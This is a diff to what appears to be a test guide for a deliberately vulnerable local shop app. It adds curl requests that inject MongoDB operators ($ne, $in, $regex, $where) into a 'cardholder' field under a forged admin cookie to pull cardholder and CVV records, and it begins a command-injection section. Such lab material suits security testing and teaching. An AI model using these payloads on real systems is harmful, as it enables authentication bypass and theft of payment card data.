@@ -116,6 +116,33 @@ curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -b "role=YWRtaW4="
 ```
 
+Проверка операторов Mongo (через `cardholder` поле):
+```bash
+# $ne
+curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'cardholder={"cardholder":{"$ne":""}}' \
+  -b "role=YWRtaW4="
+
+# $in
+curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'cardholder={"cardholder":{"$in":["Alice Hightower","Admin River North"]}}' \
+  -b "role=YWRtaW4="
+
+# $regex
+curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'cardholder={"cardholder":{"$regex":"^Alice"}}' \
+  -b "role=YWRtaW4="
+
+# $where (top-level query)
+curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'cardholder={"$where":"this.cardholder && this.cvv"}' \
+  -b "role=YWRtaW4="
+```
+
 ### Command Injection (`/shipping/carrier/diagnostics`)
 ```bash
 curl -X POST "http://localhost:8000/shipping/carrier/diagnostics" \
